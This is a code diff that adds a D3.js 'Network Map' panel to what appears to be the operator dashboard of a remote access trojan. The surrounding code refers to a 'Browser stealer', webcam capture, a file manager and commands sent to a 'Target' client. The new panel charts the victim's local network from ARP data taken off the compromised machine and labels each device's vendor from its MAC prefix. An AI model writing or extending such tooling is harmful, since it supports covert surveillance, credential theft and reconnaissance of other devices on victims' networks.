@@ -220,6 +220,9 @@
         <div class="nav-item" data-panel="network-panel" onclick="switchPanel('network-panel', this)">
             <span class="nav-icon">🌐</span><span class="nav-label">Network</span>
         </div>
+        <div class="nav-item" data-panel="map-panel" onclick="switchPanel('map-panel', this)">
+            <span class="nav-icon">🗺️</span><span class="nav-label">Network Map</span>
+        </div>
         <div class="nav-item" data-panel="files-panel" onclick="switchPanel('files-panel', this)">
             <span class="nav-icon">📁</span><span class="nav-label">File Manager</span>
         </div>
@@ -345,6 +348,31 @@
         </div>
     </div>
 
+    <!-- NETWORK MAP -->
+    <div id="map-panel" class="panel">
+        <div style="flex:1;position:relative;overflow:hidden;" id="map-container">
+            <svg id="map-svg" style="width:100%;height:100%;display:block;"></svg>
+            <div id="map-tooltip" style="position:absolute;pointer-events:none;opacity:0;background:rgba(22,27,34,0.97);border:1px solid var(--border-color);border-radius:var(--radius-md);padding:12px 14px;font-size:12px;z-index:20;backdrop-filter:blur(12px);box-shadow:var(--shadow-lg);transition:opacity 0.15s ease;min-width:180px;max-width:260px;"></div>
+            <div style="position:absolute;bottom:12px;left:12px;background:rgba(22,27,34,0.9);border:1px solid var(--border-color);border-radius:var(--radius-sm);padding:8px 10px;font-size:10px;z-index:10;display:flex;flex-direction:column;gap:4px;backdrop-filter:blur(8px);">
+                <div style="display:flex;align-items:center;gap:6px;"><span style="width:8px;height:8px;border-radius:50%;background:var(--accent-cyan);box-shadow:0 0 6px var(--accent-cyan);"></span> Target Machine</div>
+                <div style="display:flex;align-items:center;gap:6px;"><span style="width:8px;height:8px;border-radius:50%;background:var(--accent-blue);"></span> Router / Gateway</div>
+                <div style="display:flex;align-items:center;gap:6px;"><span style="width:8px;height:8px;border-radius:50%;background:var(--accent-green);"></span> Device</div>
+                <div style="display:flex;align-items:center;gap:6px;"><span style="width:8px;height:8px;border-radius:50%;background:var(--accent-orange);"></span> Unknown</div>
+            </div>
+            <div style="position:absolute;top:10px;right:10px;display:flex;flex-direction:column;gap:3px;z-index:10;">
+                <button onclick="mapZoomIn()" style="width:28px;height:28px;border-radius:5px;background:rgba(22,27,34,0.9);border:1px solid var(--border-color);color:var(--text-secondary);cursor:pointer;font-size:15px;line-height:1;">+</button>
+                <button onclick="mapZoomOut()" style="width:28px;height:28px;border-radius:5px;background:rgba(22,27,34,0.9);border:1px solid var(--border-color);color:var(--text-secondary);cursor:pointer;font-size:15px;line-height:1;">−</button>
+                <button onclick="mapResetView()" style="width:28px;height:28px;border-radius:5px;background:rgba(22,27,34,0.9);border:1px solid var(--border-color);color:var(--text-secondary);cursor:pointer;font-size:13px;line-height:1;">⌂</button>
+            </div>
+        </div>
+        <div class="files-toolbar">
+            <button onclick="emitToClient('network_info')">🔄 Refresh</button>
+            <span style="font-size:11px;color:var(--text-muted);" id="map-status">Auto-refreshes when panel opens</span>
+            <span style="flex:1;"></span>
+            <span style="font-size:11px;color:var(--accent-green);" id="map-device-count">No devices scanned</span>
+        </div>
+    </div>
+
     <!-- FUN COMMANDS -->
     <div id="fun-panel" class="panel">
         <div style="padding:16px;overflow-y:auto;flex:1;display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:12px;">
@@ -442,6 +470,7 @@
 
 <div id="toast-container"></div>
 
+<script src="https://d3js.org/d3.v7.min.js"></script>
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <script>
     const APP = {
@@ -701,6 +730,8 @@
             connHtml += '</table>';
             document.getElementById('net-connections').innerHTML = connHtml || '<span style="color:var(--text-muted);">No connections</span>';
             showToast('Network info refreshed', 'info');
+            // Build network map from ARP data
+            buildNetworkMap(data);
         });
 
         // Browser stealer
@@ -857,7 +888,8 @@
         if (panelId === 'stats-panel') emitToClient('start_system_monitor');
         else emitToClient('stop_system_monitor');
         if (panelId === 'files-panel' && !APP.currentFilePath) fileRefresh();
-        if (panelId === 'network-panel') emitToClient('network_info');
+        if (panelId === 'network-panel' || panelId === 'map-panel') emitToClient('network_info');
+        if (panelId === 'map-panel' && !MAP.built) showMapPlaceholder();
     }
 
     // ─── Webcam ────────────────────────────────────────────────────
@@ -1073,6 +1105,247 @@
         t.className = `toast ${type || 'info'}`; t.textContent = msg;
         c.appendChild(t);
         setTimeout(() => { t.style.opacity = '0'; t.style.transition = 'opacity 0.3s'; setTimeout(() => t.remove(), 300); }, 3000);
+    }
+
+    // ─── Network Topology Map (D3.js) ─────────────────────────────────
+    const MAP = { svg: null, g: null, zoom: null, sim: null, nodeG: null, linkG: null, nodes: [], links: [], built: false };
+
+    // MAC OUI → vendor lookup (common OUIs)
+    const MAC_OUI = {
+        'C0:56:27': 'TP-Link', 'B0:95:75': 'TP-Link', 'D8:47:32': 'TP-Link',
+        '00:11:32': 'Synology', '00:25:90': 'Supermicro',
+        '3C:52:82': 'HP', 'B4:99:BA': 'HP', 'D8:9E:F3': 'HP', 'E4:11:5B': 'HP',
+        'B8:27:EB': 'Raspberry Pi', 'DC:A6:32': 'Raspberry Pi', 'E4:5F:01': 'Raspberry Pi',
+        'A4:83:E7': 'Dell', 'B8:AC:6F': 'Dell', 'F0:1F:AF': 'Dell',
+        '2C:F0:5D': 'ASUS', '0C:9D:92': 'ASUS',
+        '18:B4:30': 'Google', '54:60:09': 'Google',
+        '8A:3F:1C': 'Apple', 'A8:6B:AD': 'Apple', '8C:8D:28': 'Apple', 'AC:BC:32': 'Apple', 'F0:18:98': 'Apple',
+        '94:57:2C': 'Samsung', '6C:40:08': 'Xiaomi', 'B0:83:FE': 'Reolink', 'C4:2F:90': 'Cisco',
+        '00:1A:11': 'Google', '1C:87:2C': 'D-Link', '14:CC:20': 'Netgear',
+        '00:50:56': 'VMware', '08:00:27': 'VirtualBox',
+    };
+    function lookupVendor(mac) {
+        if (!mac) return 'Unknown';
+        const prefix = mac.toUpperCase().replace(/-/g, ':').substring(0, 8);
+        return MAC_OUI[prefix] || 'Unknown';
+    }
+    function isGateway(ip) {
+        const parts = ip.split('.');
+        if (parts.length !== 4) return false;
+        const last = parseInt(parts[3]);
+        return last === 1 || last === 254;
+    }
+
+    function buildNetworkMap(data) {
+        const arp = data.arp || [];
+        const interfaces = data.interfaces || [];
+
+        // Find local IP
+        let localIp = '';
+        let localHostname = '';
+        for (const iface of interfaces) {
+            for (const addr of (iface.addresses || [])) {
+                if (addr.address && addr.address.includes('.') && !addr.address.startsWith('127.')) {
+                    localIp = addr.address;
+                    localHostname = APP.selectedClient ? (APP.clients[APP.selectedClient]?.hostname || 'Target') : 'Target';
+                    break;
+                }
+            }
+            if (localIp) break;
+        }
+        if (!localIp) {
+            localIp = '192.168.1.100';
+            localHostname = APP.selectedClient ? (APP.clients[APP.selectedClient]?.hostname || 'Target') : 'Target';
+        }
+
+        // Build nodes: target + ARP devices
+        const nodes = [{
+            id: 'target', name: localHostname, ip: localIp, mac: '', type: 'target', icon: '🖥️', vendor: ''
+        }];
+        const links = [];
+
+        for (const e of arp) {
+            if (typeof e !== 'object' || !e.ip) continue;
+            if (e.ip === localIp) continue; // skip self
+            const vendor = lookupVendor(e.mac);
+            const gw = isGateway(e.ip);
+            const nodeId = 'arp_' + e.ip.replace(/\./g, '_');
+            nodes.push({
+                id: nodeId, name: gw ? 'Gateway' : (vendor !== 'Unknown' ? vendor + ' Device' : e.ip),
+                ip: e.ip, mac: e.mac || '', type: gw ? 'router' : (vendor === 'Unknown' ? 'unknown' : 'device'),
+                icon: gw ? '📡' : (vendor === 'Unknown' ? '❓' : '💻'), vendor: vendor
+            });
+            links.push({ source: 'target', target: nodeId, connection: 'wired' });
+        }
+
+        MAP.nodes = nodes; MAP.links = links;
+        document.getElementById('map-device-count').textContent = nodes.length > 1
+            ? `🖧 ${nodes.length - 1} device${nodes.length > 2 ? 's' : ''} discovered`
+            : 'No devices discovered on LAN';
+        renderMapGraph();
+    }
+
+    function renderMapGraph() {
+        const container = document.getElementById('map-container');
+        if (!container) return;
+        const W = container.clientWidth || 800;
+        const H = container.clientHeight || 500;
+        const svg = d3.select('#map-svg');
+        svg.selectAll('*').remove();
+        svg.attr('viewBox', `0 0 ${W} ${H}`);
+
+        MAP.svg = svg;
+        MAP.g = svg.append('g');
+
+        // Stop any running simulation before rebuilding
+        if (MAP.sim) { MAP.sim.stop(); MAP.sim = null; }
+
+        const defs = svg.append('defs');
+        const glowFilter = defs.append('filter').attr('id', 'map-glow').attr('x', '-50%').attr('y', '-50%').attr('width', '200%').attr('height', '200%');
+        glowFilter.append('feGaussianBlur').attr('stdDeviation', '3').attr('result', 'blur');
+        glowFilter.append('feMerge').selectAll('feMergeNode').data(['blur', 'SourceGraphic']).enter().append('feMergeNode').attr('in', d => d);
+        const shadowFilter = defs.append('filter').attr('id', 'map-shadow').attr('x', '-30%').attr('y', '-30%').attr('width', '160%').attr('height', '160%');
+        shadowFilter.append('feDropShadow').attr('dx', '0').attr('dy', '1').attr('stdDeviation', '2').attr('flood-opacity', '0.3');
+
+        const TYPE_CFG = {
+            target: { color: '#39d2c0', r: 26, glow: true },
+            router: { color: '#58a6ff', r: 20, glow: false },
+            device: { color: '#3fb950', r: 16, glow: false },
+            unknown: { color: '#d2991d', r: 16, glow: false },
+        };
+
+        MAP.linkG = MAP.g.append('g').attr('class', 'map-links');
+        MAP.nodeG = MAP.g.append('g').attr('class', 'map-nodes');
+
+        MAP.sim = d3.forceSimulation(MAP.nodes)
+            .force('link', d3.forceLink(MAP.links).id(d => d.id).distance(130).strength(0.3))
+            .force('charge', d3.forceManyBody().strength(d => d.type === 'target' ? -500 : -180))
+            .force('center', d3.forceCenter(W / 2, H / 2))
+            .force('collision', d3.forceCollide().radius(d => (TYPE_CFG[d.type]?.r || 16) + 8))
+            .force('x', d3.forceX(W / 2).strength(0.02))
+            .force('y', d3.forceY(H / 2).strength(0.02))
+            .alphaDecay(0.03)
+            .on('tick', () => {
+                MAP.linkG.selectAll('line')
+                    .attr('x1', d => d.source.x).attr('y1', d => d.source.y)
+                    .attr('x2', d => d.target.x).attr('y2', d => d.target.y);
+                MAP.nodeG.selectAll('g').attr('transform', d => `translate(${d.x},${d.y})`);
+            });
+
+        const tgt = MAP.sim.nodes().find(n => n.id === 'target');
+        if (tgt) { tgt.fx = W / 2; tgt.fy = H / 2; }
+
+        // Links
+        MAP.linkG.selectAll('line').data(MAP.links).enter().append('line')
+            .attr('stroke', '#58a6ff').attr('stroke-opacity', 0.3).attr('stroke-width', 1.5);
+
+        // Nodes
+        const nodeEnter = MAP.nodeG.selectAll('g').data(MAP.nodes).enter().append('g')
+            .attr('class', d => `map-node map-node-${d.type}`)
+            .call(d3.drag()
+                .on('start', (ev, d) => { if (!ev.active) MAP.sim.alphaTarget(0.3).restart(); d.fx = d.x; d.fy = d.y; })
+                .on('drag', (ev, d) => { d.fx = ev.x; d.fy = ev.y; })
+                .on('end', (ev, d) => { if (!ev.active) MAP.sim.alphaTarget(0); }))
+            .on('mouseenter', (ev, d) => {
+                const tt = document.getElementById('map-tooltip');
+                const cfg = TYPE_CFG[d.type] || TYPE_CFG.unknown;
+                tt.innerHTML = `<div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid var(--border-color);"><span style="font-size:18px;">${d.icon}</span><div><div style="font-weight:600;font-size:13px;color:${cfg.color};">${escHtml(d.name)}</div><div style="font-size:10px;color:var(--text-muted);text-transform:uppercase;">${d.type === 'target' ? '⭐ Target' : d.type}</div></div></div><div style="display:flex;justify-content:space-between;padding:2px 0;"><span style="color:var(--text-muted);font-size:11px;">IP</span><span style="font-family:var(--font-mono);font-size:11px;">${escHtml(d.ip)}</span></div>` +
+                (d.mac ? `<div style="display:flex;justify-content:space-between;padding:2px 0;"><span style="color:var(--text-muted);font-size:11px;">MAC</span><span style="font-family:var(--font-mono);font-size:10px;">${escHtml(d.mac)}</span></div>` : '') +
+                (d.vendor ? `<div style="display:flex;justify-content:space-between;padding:2px 0;"><span style="color:var(--text-muted);font-size:11px;">Vendor</span><span style="font-size:11px;">${escHtml(d.vendor)}</span></div>` : '');
+                tt.style.opacity = '1';
+                const cr = container.getBoundingClientRect();
+                let l = ev.clientX - cr.left + 14, t = ev.clientY - cr.top - 10;
+                if (l + 270 > cr.width) l = ev.clientX - cr.left - 280;
+                if (t + 160 > cr.height) t = ev.clientY - cr.top - 180;
+                tt.style.left = Math.max(4, l) + 'px';
+                tt.style.top = Math.max(4, t) + 'px';
+            })
+            .on('mouseleave', () => { document.getElementById('map-tooltip').style.opacity = '0'; })
+            .on('click', (ev, d) => {
+                if (!d.x || !d.y) return;
+                const t = d3.zoomIdentity.translate(W / 2, H / 2).scale(1.3).translate(-d.x, -d.y);
+                MAP.svg.transition().duration(500).call(MAP.zoom.transform, t);
+            });
+
+        // Glow ring for target
+        nodeEnter.filter(d => d.type === 'target').append('circle')
+            .attr('r', 32).attr('fill', 'none').attr('stroke', '#39d2c0').attr('stroke-width', 1.5).attr('stroke-opacity', 0.35);
+        // Main circle
+        nodeEnter.append('circle')
+            .attr('r', d => (TYPE_CFG[d.type]?.r || 16))
+            .attr('fill', d => (TYPE_CFG[d.type]?.color || '#58a6ff'))
+            .attr('fill-opacity', 0.12).attr('stroke', d => (TYPE_CFG[d.type]?.color || '#58a6ff'))
+            .attr('stroke-width', 2).attr('filter', d => d.type === 'target' ? 'url(#map-glow)' : null);
+        // Inner dot
+        nodeEnter.append('circle').attr('r', d => (TYPE_CFG[d.type]?.r || 16) * 0.32)
+            .attr('fill', d => (TYPE_CFG[d.type]?.color || '#58a6ff'));
+        // Icon
+        nodeEnter.append('text').attr('text-anchor', 'middle').attr('dy', '-0.1em')
+            .attr('font-size', d => Math.max(10, (TYPE_CFG[d.type]?.r || 16) * 0.85) + 'px')
+            .attr('pointer-events', 'none').style('user-select', 'none').text(d => d.icon || '?');
+        // Label
+        nodeEnter.append('text').attr('text-anchor', 'middle')
+            .attr('dy', d => (TYPE_CFG[d.type]?.r || 16) + 13 + 'px')
+            .attr('fill', '#e6edf3').attr('font-size', '10px').attr('font-family', 'var(--font-sans)')
+            .attr('font-weight', d => d.type === 'target' ? '700' : '400')
+            .attr('pointer-events', 'none').style('user-select', 'none')
+            .text(d => d.name.length > 18 ? d.name.slice(0, 16) + '\u2026' : d.name);
+        // Sub-label
+        nodeEnter.append('text').attr('text-anchor', 'middle')
+            .attr('dy', d => (TYPE_CFG[d.type]?.r || 16) + 24 + 'px')
+            .attr('fill', '#8b949e').attr('font-size', '9px').attr('font-family', 'var(--font-mono)')
+            .attr('pointer-events', 'none').style('user-select', 'none').text(d => d.ip);
+
+        // Zoom
+        MAP.zoom = d3.zoom().scaleExtent([0.15, 4])
+            .on('zoom', ev => { MAP.g.attr('transform', ev.transform); });
+        svg.call(MAP.zoom);
+
+        // Resize observer — update viewBox and re-center target when container resizes
+        if (!MAP._resizeObserver) {
+            MAP._resizeObserver = new ResizeObserver(() => {
+                if (APP.currentPanel !== 'map-panel') return;
+                const c = document.getElementById('map-container');
+                if (!c || !MAP.svg || !MAP.sim) return;
+                const nW = c.clientWidth, nH = c.clientHeight;
+                MAP.svg.attr('viewBox', `0 0 ${nW} ${nH}`);
+                const tgt = MAP.sim.nodes().find(n => n.id === 'target');
+                if (tgt) { tgt.fx = nW / 2; tgt.fy = nH / 2; }
+                MAP.sim.force('center', d3.forceCenter(nW / 2, nH / 2)).alpha(0.1).restart();
+            });
+            MAP._resizeObserver.observe(document.getElementById('map-container'));
+        }
+
+        MAP.built = true;
+    }
+
+    // Show placeholder in SVG before data loads
+    function showMapPlaceholder() {
+        if (MAP.built) return;
+        const svg = d3.select('#map-svg');
+        svg.selectAll('*').remove();
+        svg.append('text').attr('x', '50%').attr('y', '45%').attr('text-anchor', 'middle')
+            .attr('fill', '#6e7681').attr('font-size', '14px').attr('font-family', 'var(--font-sans)')
+            .text('🗺️ Click Refresh to scan the network');
+        svg.append('text').attr('x', '50%').attr('y', '55%').attr('text-anchor', 'middle')
+            .attr('fill', '#484f58').attr('font-size', '11px').attr('font-family', 'var(--font-sans)')
+            .text('Select a client and open this panel to discover devices');
+    }
+
+    function mapZoomIn() { MAP.svg?.transition().duration(250).call(MAP.zoom.scaleBy, 1.4); }
+    function mapZoomOut() { MAP.svg?.transition().duration(250).call(MAP.zoom.scaleBy, 0.7); }
+    function mapResetView() {
+        if (!MAP.svg) return;
+        const container = document.getElementById('map-container');
+        const W = container?.clientWidth || 800;
+        const H = container?.clientHeight || 500;
+        const tgt = MAP.sim?.nodes()?.find(n => n.id === 'target');
+        if (tgt?.x) {
+            MAP.svg.transition().duration(500).call(MAP.zoom.transform,
+                d3.zoomIdentity.translate(W / 2 - tgt.x, H / 2 - tgt.y).scale(1));
+        } else {
+            MAP.svg.transition().duration(500).call(MAP.zoom.transform, d3.zoomIdentity);
+        }
     }
 
     function init() {
